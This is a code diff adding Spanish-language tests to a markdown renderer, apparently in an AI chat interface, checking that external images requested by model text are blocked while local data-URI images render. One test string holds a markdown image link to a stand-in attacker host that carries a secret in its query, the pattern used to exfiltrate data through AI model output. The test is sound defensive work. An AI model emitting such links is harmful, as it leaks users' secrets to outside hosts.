@@ -29,6 +29,15 @@ Object.assign(navigator, {
 })
 
 describe('RenderMarkdown', () => {
+  it('no descarga imágenes externas pedidas por el texto del modelo', async () => {
+    render(<RenderMarkdown content={'![secreto](https://evil.example/x?d=clave) y ![](//evil.example/y)'} />)
+    await waitFor(() => expect(document.querySelector('.markdown')?.textContent).toContain('Imagen externa bloqueada: secreto'))
+    expect(document.querySelector('img')).toBeNull()
+  })
+  it('conserva las imágenes que ya están en el equipo', async () => {
+    render(<RenderMarkdown content={'![dibujo](data:image/png;base64,iVBORw0KGgo=)'} />)
+    await waitFor(() => expect(document.querySelector('img[src^="data:image/png"]')).toBeTruthy())
+  })
   it('hides the explicit-skill marker in user history while preserving the instruction body', () => {
     const content = '<!-- rey30-explicit-skill:review -->\nInstrucciones guardadas y argumento original'
     render(<RenderMarkdown content={content} isUser />)
